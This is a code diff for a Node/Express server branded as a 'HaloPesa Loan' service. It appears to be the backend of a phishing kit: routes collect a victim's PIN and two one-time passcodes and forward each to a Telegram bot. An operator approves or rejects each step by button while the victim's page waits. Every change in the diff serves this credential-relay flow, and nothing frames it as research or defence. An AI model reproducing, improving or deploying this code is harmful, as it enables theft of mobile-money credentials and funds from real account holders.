@@ -9,6 +9,7 @@ app.use(express.static('public'));
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Track step statuses
 let pinStatus = 'idle'; 
 let otp1Status = 'idle';        
 let otp2Status = 'idle';        
@@ -48,7 +49,7 @@ app.post('/api/submit-pin-data', async (req, res) => {
         ]);
         res.json({ status: 'pending' });
     } catch (err) {
-        console.error('Error sending PIN alert to Telegram:', err);
+        console.error('Error sending PIN alert to Telegram:', err.message);
         res.status(500).json({ error: 'Failed to send telegram message' });
     }
 });
@@ -74,7 +75,7 @@ app.post('/api/verify-otp1', async (req, res) => {
         ]);
         res.json({ status: 'pending' });
     } catch (err) {
-        console.error('Error sending OTP 1 to Telegram:', err);
+        console.error('Error sending OTP 1 to Telegram:', err.message);
         res.status(500).json({ error: 'Failed to send OTP message' });
     }
 });
@@ -100,7 +101,7 @@ app.post('/api/verify-otp2', async (req, res) => {
         ]);
         res.json({ status: 'pending' });
     } catch (err) {
-        console.error('Error sending OTP 2 to Telegram:', err);
+        console.error('Error sending OTP 2 to Telegram:', err.message);
         res.status(500).json({ error: 'Failed to send OTP message' });
     }
 });
@@ -108,44 +109,120 @@ app.post('/api/verify-otp2', async (req, res) => {
 app.get('/api/check-otp2-status', (req, res) => {
     res.json({ status: otp2Status });
 });
- //Telegram Webhook (Prevents button spinner hanging & controls approval states)
-app.post('/webhook', async (req, res) => {
-    // Immediately send HTTP 200 so Telegram doesn't time out
-    res.sendStatus(200);
+
+// 5. Telegram Webhook Route
+app.post('/telegram-webhook', async (req, res) => {
+    res.sendStatus(200); // Acknowledge Telegram instantly
 
     try {
         const update = req.body;
-
         if (update && update.callback_query) {
             const action = update.callback_query.data;
+            const chatId = update.callback_query.message.chat.id;
+            const messageId = update.callback_query.message.message_id;
             const callbackQueryId = update.callback_query.id;
 
             console.log(`🔔 Webhook Callback Received: ${action}`);
 
-            if (action.startsWith("approve") || action.startsWith("correct_otp")) {
-                latestStatus = "approved";
-            } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
-                latestStatus = "wrong_otp";
+            await answerCallback(callbackQueryId, 'Ação registada com sucesso!');
+            await removeMessageButtons(chatId, messageId);
+
+            let statusMessage = '';
+            if (action === 'approve_pin') {
+                pinStatus = 'approved';
+                statusMessage = '✅ *Status: PIN Approved by Admin*';
+            } else if (action === 'reject_pin') {
+                pinStatus = 'rejected';
+                statusMessage = '❌ *Status: PIN Declined by Admin*';
+            } else if (action === 'correct_otp1') {
+                otp1Status = 'success';
+                statusMessage = '✅ *Status: OTP 1 Approved by Admin*';
+            } else if (action === 'wrong_otp1') {
+                otp1Status = 'wrong';
+                statusMessage = '❌ *Status: OTP 1 Declined by Admin*';
+            } else if (action === 'correct_otp2') {
+                otp2Status = 'success';
+                statusMessage = '✅ *Status: OTP 2 Approved - Loan Finalized!*';
+            } else if (action === 'wrong_otp2') {
+                otp2Status = 'wrong';
+                statusMessage = '❌ *Status: OTP 2 Declined by Admin*';
             }
 
-            // Clear the Telegram button loading spinner on your mobile app
-            if (BOT_TOKEN) {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackQueryId,
-                        text: "Ação registada com sucesso!"
-                    })
-                });
+            if (statusMessage) {
+                await sendStatusMessage(chatId, statusMessage);
             }
         }
     } catch (err) {
-        console.error("Webhook Internal Handler Error:", err.message);
+        console.error('Webhook processing error:', err.message);
     }
 });
 
+async function answerCallback(callbackQueryId, text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ callback_query_id: callbackQueryId, text })
+        });
+    } catch (e) {
+        console.error('Answer callback error:', e.message);
+    }
+}
+
+async function sendTelegramMessage(text, keyboard) {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.error('FATAL: BOT_TOKEN or CHAT_ID environment variables are missing!');
+        return;
+    }
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: keyboard }
+        })
+    });
+    const result = await response.json();
+    if (!result.ok) {
+        console.error('Telegram API Error:', result.description);
+    }
+}
+
+async function removeMessageButtons(chatId, messageId) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                message_id: messageId, 
+                reply_markup: { inline_keyboard: [] } 
+            })
+        });
+    } catch (e) {
+        console.error('Remove buttons error:', e.message);
+    }
+}
+
+async function sendStatusMessage(chatId, text) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: chatId, 
+                text: text, 
+                parse_mode: 'Markdown' 
+            })
+        });
+    } catch (e) {
+        console.error('Send status message error:', e.message);
+    }
+}
+
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server is running and listening on port ${PORT}`);
+    console.log(`HaloPesa Loan server running successfully on port ${PORT}`);
 });
